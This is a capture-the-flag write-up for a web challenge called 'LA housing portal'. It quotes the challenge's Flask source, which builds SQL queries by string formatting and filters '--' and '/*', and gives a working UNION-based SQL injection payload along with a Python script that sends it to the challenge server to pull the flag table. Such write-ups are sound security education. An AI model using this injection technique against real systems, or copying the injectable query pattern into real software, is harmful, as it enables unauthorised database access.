la housing portal
> Portal Tips Double Dashes ("--") Please do not use double dashes in any text boxes you complete or emails you send through the portal. The portal will generate an error when it encounters an attempt to insert double dashes into the database that stores information from the portal.
Also, apologies for the very basic styling. Our unpaid LA Housing(tm) RA who we voluntold to do the website that we gave FREE HOUSING for decided to quit - we've charged them a fee for leaving, but we are stuck with this website. Sorry about that.
> 
> Please note, we do not condone any actual attacking of websites without permission, even if they explicitly state on their website that their systems are vulnerable.

```py
import sqlite3
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def search_roommates():
    data = request.form.copy()

    if len(data) > 6:
        return "Invalid form data", 422
    
    
    for k, v in list(data.items()):
        if v == 'na':
            data.pop(k)
        if (len(k) > 10 or len(v) > 50) and k != "name":
            return "Invalid form data", 422
        if "--" in k or "--" in v or "/*" in k or "/*" in v:
            return render_template("hacker.html")
        
    name = data.pop("name")

    
    roommates = get_matching_roommates(data)
    return render_template("results.html", users = roommates, name=name)
    

def get_matching_roommates(prefs: dict[str, str]):
    if len(prefs) == 0:
        return []
    query = """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
    print(query)
    conn = sqlite3.connect('file:data.sqlite?mode=ro', uri=True)
    cursor = conn.cursor()
    cursor.execute(query)
    r = cursor.fetchall()
    cursor.close()
    return r

# def get_flag():
#     conn = sqlite3.connect('file:data.sqlite?mode=ro', uri=True)
#     cursor = conn.cursor()
#     cursor.execute("select * from flag;")
#     r = cursor.fetchall()
#     cursor.close()
#     return r
```

Goal:
- SQL injection
- pass all the check
- payload cannot place at name (it pops before `get_matching_roommates`)

## Solve
The payload I choose is `' UNION select 0,flag,2,3,4,5 from flag where ''='`

I make a simple python script to send that request
```py
import requests as req

# url = "http://0.0.0.0:5000/submit"
url = "https://la-housing.chall.lac.tf/submit"
key = "guests"
value = "' UNION select 0,flag,2,3,4,5 from flag where ''='"
assert len(key) <= 10
assert len(value) <= 50

data = {
    key: value,
    "name":"hacker"
}
response =req.post(url, data)
print(response.text)

```